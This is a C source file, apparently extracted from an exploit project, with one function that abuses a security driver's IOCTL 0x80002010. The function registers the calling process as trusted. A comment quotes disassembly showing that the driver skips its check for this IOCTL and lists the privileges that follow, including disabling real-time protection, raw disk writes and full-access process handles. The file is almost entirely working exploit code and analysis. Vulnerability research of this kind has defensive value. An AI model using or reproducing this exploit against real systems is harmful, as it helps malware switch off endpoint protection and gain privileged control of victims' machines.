#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  HANDLE ;
typedef  int /*<<< orphan*/  DWORD ;
typedef  int /*<<< orphan*/  BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  DeviceIoControl (int /*<<< orphan*/ ,int,int /*<<< orphan*/ *,int,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FALSE ; 
 int /*<<< orphan*/  GetCurrentProcessId () ; 
 int /*<<< orphan*/  TRUE ; 

BOOL RegisterProcessByIOCTL(HANDLE hDevice)
{
	DWORD pid, BytesReturned;
	
	/*
	IOCTL 0x80002010 registers a process, by its PID, as trusted by the driver. Registered
	processes can send special IOCTLs to the driver to do stuff like:
		- Enable/Disable real-time protection
		- Write to raw disk
		- Open full access handles to processes
		- ...etc
	
	When a process sends a special IOCTL, the driver checks if that process is registered (as 
	shown in the disassembly below at address 0000000140010573).
	However, when a process sends the IOCTL 0x80002010 to register a process by its PID, the driver
	doesn't check to see if the requestor itself is registered (0000000140010553).
	That way, any process can register any other process (including itself) with the driver.

	.text:000000014001054A                 mov     ebx, [rcx+_IO_STACK_LOCATION.Parameters.DeviceIoControl.IoControlCode]
	.text:000000014001054D                 cmp     ebx, 80002010h
	.text:0000000140010553                 jz      short find_ioctl_dispatcher ;jump past the check
	
	[......]

	.text:0000000140010573                 mov     edx, 1
	.text:0000000140010578                 mov     ecx, ebp ; Requestor_PID
	.text:000000014001057A                 call    IsProcessRegistered
	.text:000000014001057F                 lea     rdx, aMain_c
	.text:0000000140010586                 test    eax, eax
	.text:0000000140010588                 jnz     short loc_1400105C2
	.text:000000014001058A                 mov     [rsp+68h+var_38], ebp
	.text:000000014001058E                 lea     rax, aProcessidDIsNo
	.text:0000000140010595                 mov     edi, STATUS_ACCESS_DENIED

	[......]

	.text:00000001400105C8 find_ioctl_dispatcher:                  ; CODE XREF: sub_1400104BC+97j
	.text:00000001400105C8                                         ; sub_1400104BC+ACj

	[......]

	.text:0000000140010612                 cmp     ebx, 80002010h
	.text:0000000140010618                 jz      loc_1400106D7  ; dispatch the IOCTL
	*/

	pid = GetCurrentProcessId(); //Register our process with the driver
	if (!DeviceIoControl(hDevice, 0x80002010, &pid, sizeof(DWORD), NULL, 0, &BytesReturned, NULL))
	{
		return FALSE;
	}

	return TRUE;
}